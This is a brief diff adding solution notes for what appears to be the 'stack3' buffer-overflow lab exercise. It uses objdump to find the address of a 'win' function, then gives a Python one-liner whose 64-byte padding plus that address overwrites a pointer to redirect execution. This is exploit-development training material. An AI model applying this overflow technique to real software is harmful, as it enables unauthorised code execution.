@@ -1,0 +1,5 @@
+1: Get location of function to jump to
+	objdump -d stack3 | grep win -A 10
+location was 08048424
+2:
+	python -c "print ('A' * 64 + chr(0x24) + chr(0x84) + chr(0x04) + chr(0x08))" | ./stack3
